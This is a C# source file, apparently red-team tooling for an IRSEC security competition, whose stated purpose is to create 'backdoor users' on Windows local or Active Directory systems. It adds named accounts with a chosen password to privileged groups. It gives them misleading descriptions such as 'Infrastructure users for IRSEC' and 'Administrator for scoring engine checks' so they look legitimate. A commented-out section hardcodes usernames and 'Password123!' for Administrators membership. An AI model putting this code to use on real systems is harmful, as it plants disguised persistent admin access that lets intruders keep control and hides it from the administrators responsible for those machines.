
using System;
using System.Data;
using System.DirectoryServices;
using System.Runtime.InteropServices;

namespace ezclap
{
    /*
    *  Description: Creates backdoor users in either local or Active Directory environment 
    * 
    *  Params:
    *      - (string[]) name   = List of user names to be added 
    *      - (string)   pass   = Password of the user  
    *      - (string[]) groups = List of groups the user will join 
    */
    public class AddUser
    {
        // Should probably initialize an object with .username .password .group attributes 
        // and then do some OOP with it. For now, this is just glorified scripting lmao 
        public AddUser(string[] name, string pass, string[] groups)
        {
            /* // Ignoring this for now 
            string[] localusers = { "scorechecks", "worker", "flagcheck" };
            string localPassword = "Password123!";
            foreach(string localuser in localusers)
            {
                addLocalUser(localuser, localPassword);
            }
            */

            Initialize(name, pass, groups);
        }

        /* // Ignoring this for now 
        public static void addLocalUser(string username, string password)
        {

            System.Security.SecureString securePasswd = new System.Security.SecureString();
            foreach (char c in password.ToCharArray())
                securePasswd.AppendChar(c);

            string USER_NAME = username;
            System.Security.SecureString oPW = securePasswd;

            DirectoryEntry oComputer = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
            DirectoryEntry oNewUser = oComputer.Children.Add(USER_NAME, "user");

            IntPtr pString = IntPtr.Zero;

            pString = Marshal.SecureStringToGlobalAllocUnicode(oPW);

            oNewUser.Invoke("SetPassword", new object[] { Marshal.PtrToStringUni(pString) });
            oNewUser.Invoke("Put", new object[] { "Description", "Administrator for scoring engine checks" });
            oNewUser.CommitChanges();
            Marshal.ZeroFreeGlobalAllocUnicode(pString);

            DirectoryEntry oGroup = oComputer.Children.Find("Administrators", "group");

            oGroup.Invoke("Add", new object[] { oNewUser.Path.ToString() });
        }
        */

        public static void Initialize(string[] name, string pass, string[] groups)
        {
            foreach (string user in name)
            {
                try
                {
                    DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                    DirectoryEntry newUser = AD.Children.Add(user, "user");
                    newUser.Invoke("SetPassword", new object[] { pass });
                    newUser.Invoke("Put", new object[] { "Description", "Infrastructure users for IRSEC" });
                    newUser.CommitChanges();

                    foreach (string groupName in groups)
                    {
                        try
                        {
                            Console.WriteLine("[DEBUG] Adding [" + user + " to Group: " + groupName + "... ");
                            DirectoryEntry group = AD.Children.Find(groupName, "group");
                            if (group != null)
                            {
                                group.Invoke("Add", new object[] { newUser.Path.ToString() });
                                Console.WriteLine("[DEBUG] Adding Domain Admins... Username: {0}               Password: {1}", user, pass);
                            }
                        }
                        catch (Exception ex)
                        {
                            continue;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }

    }
}
